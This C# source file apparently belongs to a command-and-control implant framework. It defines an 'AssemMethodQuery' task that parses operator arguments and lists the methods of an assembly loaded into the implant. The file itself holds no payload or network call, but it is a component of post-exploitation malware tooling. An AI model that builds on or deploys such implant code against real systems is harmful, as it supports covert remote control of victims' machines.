using Implant.Models;
using Implant.Utils;
using System.Text;

namespace Implant.Tasks.Execute
{
    class AssemMethodQuery : ImplantCommands
    {
        private string assemName { get; set; }

        public override string Name => "AssemMethodQuery";

        public override string Execute(ImplantTask task)
        {
            StringBuilder _out = new StringBuilder();
            
            var opts = ImplantOptionUtils.ReturnMethod(task);
            var args = ImplantOptionUtils.ParseArgs(task.Args);

            foreach (var opt in opts)
            {
                foreach (var _params in args.Params)
                {
                    if ((_params.OptionName.ToLower() is "assemname")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower())) {
                        assemName = _params.OptionValue;
                    }
                }
            }
            
            _out.AppendLine(LoadFunctions.returnAssemMethods(assemName));
            return _out.ToString();
        }
    }
}
